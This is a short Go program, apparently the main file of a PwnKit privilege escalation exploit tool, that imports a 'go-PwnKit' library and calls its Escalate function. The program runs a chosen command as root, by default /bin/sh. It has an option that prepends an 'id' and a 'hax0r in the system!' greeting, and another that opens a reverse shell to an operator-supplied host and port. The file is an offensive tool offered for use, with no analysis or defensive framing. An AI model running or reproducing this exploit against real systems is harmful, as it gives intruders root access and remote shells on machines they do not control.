package main

import (
	"flag"
	gopwnkit "github.com/OXDBXKXO/go-PwnKit"
)

func main() {
	cmd := flag.String("c", "/bin/sh", "Command to execute as root")
	greetings := flag.Bool("g", false, "Append id and greetings to your command")
	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: host:port")
	flag.Parse()

	if *greetings {
		gopwnkit.Escalate("id; echo \"hax0r in the system!\";"+*cmd, *reverseShell)
	} else {
		gopwnkit.Escalate(*cmd, *reverseShell)
	}
}
